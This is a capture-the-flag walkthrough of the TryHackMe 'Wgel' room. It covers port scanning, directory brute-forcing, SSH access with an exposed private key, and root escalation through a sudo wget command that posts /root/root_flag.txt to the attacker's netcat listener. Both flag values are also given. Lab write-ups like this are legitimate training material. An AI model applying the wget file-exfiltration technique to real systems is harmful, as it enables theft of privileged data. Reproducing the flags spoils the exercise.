# Wgel

<div align="left">

<figure><img src="../.gitbook/assets/image (134).png" alt="" width="188"><figcaption></figcaption></figure>

</div>

🔗 [Wgel](https://tryhackme.com/room/wgelctf)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.22.231`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.22.231 wgel.thm" >> /etc/hosts

mkdir thm/wgel.thm
cd thm/wgel.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 wgel.thm
ING wgel.thm (10.10.22.231) 56(84) bytes of data.
64 bytes from wgel.thm (10.10.22.231): icmp_seq=1 ttl=63 time=63.8 ms
64 bytes from wgel.thm (10.10.22.231): icmp_seq=2 ttl=63 time=69.9 ms
64 bytes from wgel.thm (10.10.22.231): icmp_seq=3 ttl=63 time=63.3 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 wgel.thm -oG nmap/port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 13:14 EDT
Initiating SYN Stealth Scan at 13:14
Scanning wgel.thm (10.10.22.231) [65536 ports]
Discovered open port 22/tcp on 10.10.22.231
Discovered open port 80/tcp on 10.10.22.231
Completed SYN Stealth Scan at 13:14, 14.20s elapsed (65536 total ports)
Nmap scan report for wgel.thm (10.10.22.231)
Host is up, received user-set (0.070s latency).
Scanned at 2023-10-06 13:14:45 EDT for 14s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open ports on the machine: 21, 22, 80.

Now, we need to search which services are running on open ports:

```bash
nmap -p22,80 -n -Pn -vvv -sCV --min-rate 5000 wgel.thm -oN nmap/open_port
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that we've two open ports: 22 and 80.

### Task 3 - What are the contents of user.txt?

Then we can start to see website (port 80):

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

and see page source for checking information disclosure.

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

Very good! Thanks to this message, we know that Jessie is a user/web master.

Another good thing to do, is find hidden paths on website using gobuster

```
gobuster dir -u wgel.thm -w /usr/share/wordlists/dirb/common.txt
```

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

We can explore /sitemap path:

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

We can try to do a new gobuster search start at this point:

```bash
gobuster dir -u wgel.thm/sitemap -w /usr/share/wordlists/dirb/common.txt  
```

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

<div align="left">

<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

</div>

we've find and id\_rsa:

<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

remembering that we've user and id rsa, first take permission to id\_rsa file and try login:

```bash
chmod 600 id_rsa
ssh -i id_rsa jessie@wgel.thm
```

<div align="left">

<figure><img src="../.gitbook/assets/Schermata del 2023-10-07 15-16-33.png" alt=""><figcaption></figcaption></figure>

</div>

We're in, try to find user.txt flag using find command:\


```bash
find / -type f -iname "*flag.txt" 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1 (user_flag.txt)</summary>

057c67131c3d5e42dd5cd3075b198ff6

</details>

### Task 4 - What are the contents of root.txt?

We can do sudo -l command to discover user's permissions.

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

We can run /usr/bin/wget as root. Perfect, time to go to GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) and find our exploit.&#x20;

<figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/wget/">https://gtfobins.github.io/gtfobins/wget/</a></p></figcaption></figure>

<div align="left">

<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

</div>

unfortunately, it doesn't work!

Checking on google, we find this good article that suggests to use post-file option of wget  command, to send the content of any file.

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption><p><a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/</a></p></figcaption></figure>

More probably root flag there're in root path and its name will be similar than user\_flag.txt, then, we can try to setting post-file option: —post-file=/root/root\_flag.txt, add our IP and open a listen session with netcat to receive file.

<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>

```bash
sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
```

<figure><img src="../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

<div align="left">

<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

</div>

Well done! Root flag found!

<details>

<summary>🚩 Flag 2 (root_flag.txt)</summary>

b1b968b37519ad1daa6408188649263d

</details>
